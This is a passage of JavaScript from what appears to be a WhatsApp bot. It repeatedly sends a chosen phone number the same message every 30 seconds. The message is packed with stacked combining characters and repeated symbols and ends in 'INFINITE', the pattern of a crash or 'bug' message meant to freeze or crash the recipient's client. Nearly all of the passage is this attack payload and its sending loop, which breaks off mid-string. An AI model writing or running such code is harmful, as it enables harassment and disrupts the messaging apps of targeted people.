            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 